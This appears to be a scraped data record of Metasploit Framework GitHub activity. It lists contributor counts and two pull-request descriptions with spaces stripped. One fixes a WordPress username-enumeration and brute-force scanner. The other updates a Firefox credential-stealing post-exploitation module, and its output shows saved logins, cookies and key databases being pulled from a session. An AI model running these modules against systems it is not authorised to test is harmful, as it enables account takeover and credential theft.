rapid7, 60
gwillcox-r7, 23
dwelch-r7, 17
adfoster-r7, 14
smcintyre-r7, 8
jmartin-r7, 8
friedrico, 8
zeroSteiner, 6
wesinator, 6
bcoles, 6
space-r7, 5
bwatters-r7, 4
timwr, 3
thesunRider, 3
security-curious, 3
pingport80, 3
nikhil-su, 3
jaleshkumar4, 3
capme, 3
xenoamess-fork, 2
cdelafuente-r7, 2
XenoAmess, 1
title:FixWordpressuserloginvalidationforrecentversionsofWordPress, 1
ref:wordpress_login_validation_fix, 1
label:thesunRider:wordpress_login_validation_fix, 1
body:ThisPRfixes[#14790](https://github.com/rapid7/metasploit-framework/issues/14790#issue-813725448\https://github.com/rapid7/metasploit-framework/issues/14790#issue-813725448\)\r\n\r\n##BUG\r\n\r\nWhiletryingusing\r\n\r\n`module>auxiliary/scanner/http/wordpress_login_enum`\r\n\r\nUservalidationdoesnotoccurcorrectlyinwordpress5.x\r\n\r\n\r\n\r\n##Verification\r\n\r\n-[x]LaunchWordpress>=5.xonlocalhost@8000\r\n-[x]Startmsfconsole\r\n-[x]credsadduser:test\r\n-[x]useauxiliary/scanner/http/wordpress_login_enum\r\n-[x]setoptionsandrun\r\n-[x]__Verify__wethertheuser`test`wasrecognised\r\n\r\n##ExpectedOutput\r\n\r\n```\r\nmsf6>useauxiliary/scanner/http/wordpress_login_enum\r\nmsf6auxiliary(scanner/http/wordpress_login_enum)>showoptions\r\n\r\nModuleoptions(auxiliary/scanner/http/wordpress_login_enum):\r\n\r\nNameCurrentSettingRequiredDescription\r\n--------------------------------------\r\nBLANK_PASSWORDSfalsenoTryblankpasswordsforallusers\r\nBRUTEFORCEtrueyesPerformbruteforceauthentication\r\nBRUTEFORCE_SPEED5yesHowfasttobruteforcefrom0to5\r\nDB_ALL_CREDSfalsenoTryeachuser/passwordcouplestoredinthecurrentdatabase\r\nDB_ALL_PASSfalsenoAddallpasswordsinthecurrentdatabasetothelist\r\nDB_ALL_USERSfalsenoAddallusersinthecurrentdatabasetothelist\r\nENUMERATE_USERNAMEStrueyesEnumerateusernames\r\nPASSWORDnoAspecificpasswordtoauthenticatewith\r\nPASS_FILEnoFilecontainingpasswordsoneperline\r\nProxiesnoAproxychainofformattype:host:port[type:host:port][...]\r\nRANGE_END10noLastuseridtoenumerate\r\nRANGE_START1noFirstuseridtoenumerate\r\nRHOSTSyesThetargethost(s)rangeCIDRidentifierorhostsfilewithsyntax'file:<path>'\r\nRPORT80yesThetargetport(TCP)\r\nSSLfalsenoNegotiateSSL/TLSforoutgoingconnections\r\nSTOP_ON_SUCCESSfalseyesStopguessingwhenacredentialworksforahost\r\nTARGETURI/yesThebasepathtothewordpressapplication\r\nTHREADS1yesThenumberofconcurrentthreads(maxoneperhost)\r\nUSERNAMEnoAspecificusernametoauthenticateas\r\nUSERPASS_FILEnoFilecontainingusersandpasswordsseparatedbyspaceonepairperline\r\nUSER_AS_PASSfalsenoTrytheusernameasthepasswordforallusers\r\nUSER_FILEnoFilecontainingusernamesoneperline\r\nVALIDATE_USERStrueyesValidateusernames\r\nVERBOSEtrueyesWhethertoprintoutputforallattempts\r\nVHOSTnoHTTPservervirtualhost\r\n\r\nmsf6auxiliary(scanner/http/wordpress_login_enum)>setRHOSTS127.0.0.1\r\nRHOSTS=>127.0.0.1\r\nmsf6auxiliary(scanner/http/wordpress_login_enum)>setRPORT8080\r\nRPORT=>8080\r\nmsf6auxiliary(scanner/http/wordpress_login_enum)>setDB_ALL_USERStrue\r\nDB_ALL_USERS=>true\r\nmsf6auxiliary(scanner/http/wordpress_login_enum)>run\r\n\r\n[-]Theconnectionwasrefusedbytheremotehost(127.0.0.1:8080).\r\n[-]/doesnotseemtobeWordPresssite\r\n[*]Scanned1of1hosts(100%complete)\r\n[*]Auxiliarymoduleexecutioncompleted\r\nmsf6auxiliary(scanner/http/wordpress_login_enum)>setRPORT8000\r\nRPORT=>8000\r\nmsf6auxiliary(scanner/http/wordpress_login_enum)>run\r\n\r\n[*]/-WordPressVersion5.6.1detected\r\n[*]127.0.0.1:8000-/-WordPressUser-Enumeration-RunningUserEnumeration\r\n[*]127.0.0.1:8000-/-WordPressUser-Validation-RunningUserValidation\r\n[*]/-WordPressUser-Validation-CheckingUsername:'Administrator'\r\n[-]127.0.0.1:8000-[1/4]-/-WordPressUser-Validation-InvalidUsername:'Administrator'\r\n[*]/-WordPressUser-Validation-CheckingUsername:'administrator'\r\n[-]127.0.0.1:8000-[2/4]-/-WordPressUser-Validation-InvalidUsername:'administrator'\r\n[*]/-WordPressUser-Validation-CheckingUsername:'test'\r\n[+]/-WordPressUser-Validation-Username:'test'-isVALID\r\n[+]/-WordPressUser-Validation-Found1validuser\r\n[-]127.0.0.1:8000-[4/4]-/-WordPressUser-Validation-InvalidUsername:'normal'\r\n[*]127.0.0.1:8000-[5/4]-/-WordPressBruteForce-RunningBruteforce\r\n[*]Scanned1of1hosts(100%complete)\r\n[*]Auxiliarymoduleexecutioncompleted\r\nmsf6auxiliary(scanner/http/wordpress_login_enum)>\r\n\r\n```\r\n\r\nPleaseremindmeifanyissueisfoundwiththefix!;-), 1
body:Thedefaultfirefoxprofiledirectorynownolongerendsin`.default`butinstead`.default-release`.Forbackwardscompatthenewregexsupportsboth.Formoreinformationsee:\r\n\r\nhttps://support.mozilla.org/bm/questions/1264072#answer-1235567\r\n\r\nIt'spossiblewemightwanttoalsosupportthingslike`.default-nightly`etcbutreallyifwewanttodomorethangrabthedefaultprofileweshouldreadthe`profiles.ini`filetogetanitemizedlistofprofilesfromFirefoxitself.Thiswouldalsofuture-proofthisscriptandallowustocapturenon-defaultprofiles.\r\n\r\nSinceprofilesarenotgenerallyusedbymostFirefoxusersjustgoingforthesimplersolutionofadjustingtheregex.\r\n\r\n##Verification\r\n\r\nListthestepsneededtomakesurethisthingworks\r\n\r\n-[]Start`msfconsole`\r\n-[]`usepost/multi/gather/firefox_creds`\r\n-[]**Verify**thethingdoeswhatitshould\r\n\r\n```\r\nmsf6post(multi/gather/firefox_creds)>setSESSION1\r\nSESSION=>1\r\nmsf6post(multi/gather/firefox_creds)>run\r\n\r\n[*]CheckingforFirefoxprofilein:/home/minhtuan/.mozilla/firefox\r\n\r\n[*]Profile:/home/minhtuan/.mozilla/firefox/fvbljmev.default-release\r\n[+]Downloadedlogins.json:/home/kali/.msf4/loot/20210310215308_default_172.16.3.129_ff.fvbljmev.logi_049030.bin\r\n[+]Downloadedcookies.sqlite:/home/kali/.msf4/loot/20210310215309_default_172.16.3.129_ff.fvbljmev.cook_856738.bin\r\n[+]Downloadedcert9.db:/home/kali/.msf4/loot/20210310215309_default_172.16.3.129_ff.fvbljmev.cert_400135.db\r\n[+]Downloadedkey4.db:/home/kali/.msf4/loot/20210310215309_default_172.16.3.129_ff.fvbljmev.key4_501159.db\r\n\r\n[*]Profile:/home/minhtuan/.mozilla/firefox/1snfwp29.default\r\n\r\n[*]Postmoduleexecutioncompleted\r\n```\r\n\r\nCantestitoutyourselfonthisVulnhub-https://www.vulnhub.com/entry/bluesky-1623/, 1
